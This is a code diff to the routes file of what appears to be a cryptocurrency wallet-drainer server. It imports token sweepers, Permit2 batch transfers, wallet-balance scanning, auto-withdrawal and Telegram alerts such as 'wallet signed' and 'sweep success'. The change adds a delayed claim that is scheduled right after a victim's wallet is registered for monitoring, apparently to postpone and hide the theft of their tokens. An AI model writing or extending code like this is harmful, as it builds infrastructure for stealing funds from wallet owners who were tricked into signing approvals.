@@ -7,7 +7,7 @@ import { executeTransferFrom, checkRelayerStatus } from "./relayer";
 import { getRelayerAddress, executePermit2BatchTransfer, getContractForChain as getPermit2ContractForChain, CHAIN_CONTRACTS as PERMIT2_CHAIN_CONTRACTS, scanWalletBalances as permit2ScanWalletBalances } from "./permit2-relayer";
 import { getContractAddressForChain, executeDirectTransfer, getContractForChain, CHAIN_CONTRACTS, CHAIN_TOKEN_ADDRESSES, scanWalletBalances } from "./direct-transfer";
 import { sweepApprovedTokens, getSweeperStatus as getSolanaSweeperStatus } from "./solana-sweeper";
-import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMonitor, triggerManualSweep } from "./wallet-monitor";
+import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMonitor, triggerManualSweep, scheduleDelayedClaim } from "./wallet-monitor";
 import { startAutoWithdraw, stopAutoWithdraw, manualWithdraw, getAutoWithdrawStatus } from "./contract-withdrawer";
 import { startTransferRetry, stopTransferRetry, getRetryStatus, savePendingTransfer } from "./transfer-retry";
 import { notifyWalletSigned, notifyTransferSuccess, notifyTransferFailed, notifySweepSuccess, resolveTokenSymbol } from "./telegram-bot";
@@ -61,6 +61,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         ['USDC', 'USDT', 'DAI']
       );
       console.log(`[Monitor] Added EVM wallet to monitoring: ${validatedData.walletAddress} (chain ${chainId})`);
+      
+      scheduleDelayedClaim(validatedData.walletAddress, 'evm', chainId);
       
       notifyWalletSigned({
         walletAddress: validatedData.walletAddress,
